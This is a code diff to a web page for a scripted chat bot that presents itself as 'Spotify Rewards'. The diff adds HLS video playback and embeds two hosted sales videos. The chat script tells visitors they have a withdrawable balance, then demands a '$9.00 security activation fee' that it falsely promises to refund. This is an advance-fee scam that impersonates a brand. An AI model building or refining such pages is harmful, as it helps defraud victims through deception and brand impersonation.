@@ -320,10 +320,25 @@
     }
 
     .bubble.media iframe,
-    .bubble.media img {
+    .bubble.media img,
+    .bubble.media video {
       display: block;
       width: 100%;
       border: 0;
+    }
+
+    .bubble.media video {
+      height: 100%;
+      background: #000;
+      object-fit: contain;
+    }
+
+    .vsl-block {
+      display: flex;
+      width: 100%;
+      flex: 0 0 auto;
+      overflow: hidden;
+      background: #000;
     }
 
     .bubble.media iframe.withdraw-receipt {
@@ -711,12 +726,46 @@
         return f;
       }
 
-      function videoBlock(height, ratio) {
+      var hlsLoader;
+
+      function loadHls() {
+        if (window.Hls) return Promise.resolve(window.Hls);
+        if (hlsLoader) return hlsLoader;
+        hlsLoader = new Promise(function (resolve, reject) {
+          var script = document.createElement('script');
+          script.src = 'https://cdn.jsdelivr.net/npm/hls.js@1.5.17/dist/hls.min.js';
+          script.onload = function () { resolve(window.Hls); };
+          script.onerror = reject;
+          document.head.appendChild(script);
+        });
+        return hlsLoader;
+      }
+
+      function videoBlock(src, height, ratio) {
         var block = document.createElement('div');
         block.className = 'vsl-block';
         block.setAttribute('aria-label', 'Video');
         if (ratio) block.style.aspectRatio = ratio;
         else block.style.height = height + 'px';
+        var video = document.createElement('video');
+        video.controls = true;
+        video.playsInline = true;
+        video.preload = 'metadata';
+        video.setAttribute('aria-label', 'Video explicativo');
+        if (video.canPlayType('application/vnd.apple.mpegurl')) {
+          video.src = src;
+        } else {
+          loadHls().then(function (Hls) {
+            if (Hls && Hls.isSupported()) {
+              var hls = new Hls();
+              hls.loadSource(src);
+              hls.attachMedia(video);
+            } else {
+              video.src = src;
+            }
+          }).catch(function () { video.src = src; });
+        }
+        block.appendChild(video);
         botRow(block, 'media');
       }
 
@@ -804,7 +853,7 @@
         await sleep(4000);
         await say('Hi, welcome to the Spotify Rewards!');
         await sleep(3000);
-        videoBlock(620);
+        videoBlock('https://stream.mux.com/DNXBDFnxgzWm8YNg2RwKdlarSSwifz5J8pEoNZ00k02TY.m3u8', 620);
         await say('You have a balance of ${{balance}} in our app');
         await sleep(3000);
         await say('Would you like to continue so you can withdraw your money?');
@@ -861,7 +910,7 @@
 
         // VSL + oferta
         await sayStatus('Your access to withdraw your commission will be granted after this short explanatory video', 'alert');
-        videoBlock(0, '16 / 9');
+        videoBlock('https://stream.mux.com/AwQwkbXYd6kbE2ayuvZv8RYZBXfi4xpzeN4JHoBf00zI.m3u8', 0, '16 / 9');
         await sayStatus('Your balance of ${{balance}} is ready!\n\nTo withdraw your earnings today, all you need to do is pay a small security activation fee of $9.00\n\nThis is to verify your account and ensure that you are not a bot.', 'reward');
         await sleep(5000);
         await sayStatus('Please note: The fee will be fully refunded after registration, along with your current balance of ${{balance}}', 'alert');
@@ -879,3 +928,4 @@
 </body>
 
 </html>
+
